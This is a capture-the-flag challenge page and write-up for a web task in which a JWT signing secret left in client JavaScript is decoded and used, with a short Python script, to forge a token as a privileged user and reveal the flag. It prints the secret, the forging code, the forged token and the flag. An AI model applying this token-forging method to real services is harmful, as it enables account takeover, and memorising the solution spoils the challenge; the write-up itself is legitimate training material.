# JETS

- Published: 12/15/2024 (#15/25 in event)
- Category: Web exploitation
- Points: 70
- Author: GodderE2D

It seems like the Secret Society of K.U.N.A.L has invested in another business…Oh no.

If those planes come anywhere close to Santa—after his “adventure” in France—he’ll be scathed for good. Those reindeer
don’t like inhaling kerosene!

Agent, we need you to infiltrate their system and gather some information for our engineers at Elves Intelligence. We
believe the plane they’re using is a bit special…it may have been custom-built for K.U.N.A.L himself!

Here’s their website, agent: [https://jets.csd.lol/](https://jets.csd.lol/). Best of luck.

---

_**You are only allowed to test in the scope `https://jets.csd.lol/*`.** Blind brute-force request sending (e.g. using
tools like DirBuster) can trigger Cloudflare rate limits. Do not attempt to bypass Cloudflare limits. Therefore, if you
wish to brute-force, please limit your wordlists or attack scope._

## Hints

**Hint 1:**

What's a [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token)? Look closely at `/script.js`; the developer
might've left something in there by accident!

**Hint 2:**

Try looking at `/script.js`; there's a special username in there! Is it possible to login as that special user?

Your browser's DevTools will help solve this challenge.

## Write-up

<details>
<summary>Reveal write-up</summary>

When we go to the website, we can see the sign up option on the screen, so let's sign up using random credentials.

Once we sign up, we can go to Storage in our DevTools, where we see a cookie named token.

We can easily decrypt the Value of the token using jwt.io which can help us decode this JSON Web Token.

Encrypted Token :

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3MzU0NDM5MjcsImV4cCI6MTczNTQ0NzUyNywic3ViIjoidGVzdCJ9.qW6uinpVkLKBAbLpwTiGH9dxElp7mMosW9DhuwPfZ9U`

Decrypted Token :

```txt
{
  "iat": 1735443927,
  "exp": 1735447527,
  "sub": "test"
}
```

Here, iat and exp are time stamps, and sub is the username

Now, let's look at the source code. an interesting part of the js code is:

```js
if (token) {
  const { sub } = jwtDecode(token, {
    secret: atob("MWRkMjJiYjQyNzBjYjE0NTcyMzIyZTAzNDI1YzAwNTgzZTAyYmY2M2Y1YzdhZjdkMmYzODdlMjRlN2Q1YjkzMQ=="),
  });
  console.log(sub);

  if (sub === atob("S1VuNEw=")) {
    footer.style.display = "block";
  }
```

In this example, we can see that secret is used for securing and validating JWT, and sub which is an username. both are
encrypted in base64, so let's decode them.

```txt
secret : 1dd22bb4270cb14572322e03425c00583e02bf63f5c7af7d2f387e24e7d5b931
sub : KUn4L
```

to sign in KUn4L's account, we have to generate a JWT with their user id, time and we have to sign it with secret .

Here's the code in python that does exactly that:

```py
import jwt
import time

secret = "1dd22bb4270cb14572322e03425c00583e02bf63f5c7af7d2f387e24e7d5b931"

payload = {
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
    "sub": "KUn4L"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

let's run the code:

```bash
jstr$ python main.py
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3MzU0NDcwNDEsImV4cCI6MTczNTQ1MDY0MSwic3ViIjoiS1VuNEwifQ.0cVePmTMBbm5u6RVaYSDOScCmpn5HOIJV8fhvcVbd6E
```

We can now switch the token value by putting this JWT instead of the old one.

When we reload the website after switching JWT, the third picture we see, is a Walmart bag, which has the flag.

Flag: `csd{Wh47_D1D_KUN4I_do_7h1S_71M3}`

</details>

Write-up by .jstr\_
